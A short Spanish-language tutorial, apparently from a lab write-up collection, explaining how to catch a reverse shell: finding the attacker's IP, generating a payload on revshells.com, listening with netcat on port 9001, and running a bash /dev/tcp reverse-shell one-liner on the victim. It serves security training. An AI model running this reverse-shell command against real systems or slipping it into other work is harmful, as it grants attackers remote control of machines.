# CONCEPTOS BÁSICOS DE HACKING
# Uso de netcat
Si quiero obtener una reverse shell en mi máquina atacante, primero debo conocer la dirección IP, que puedo obtener con el siguiente comando:  
`hostname -I` 

Ahora, puedo ir a la página revshells.com y generar el payload.  
![1](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_1.jpg)  


En la página, ingreso la dirección IP de la máquina atacante y genero el payload.  
Me pongo en escucha en el puerto, por ejemplo, 9001, con el siguiente comando:  

`sudo nc -lvnp 9001`  

Luego, en la máquina víctima, ejecuto el payload generado en revshells.com:  

`sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`

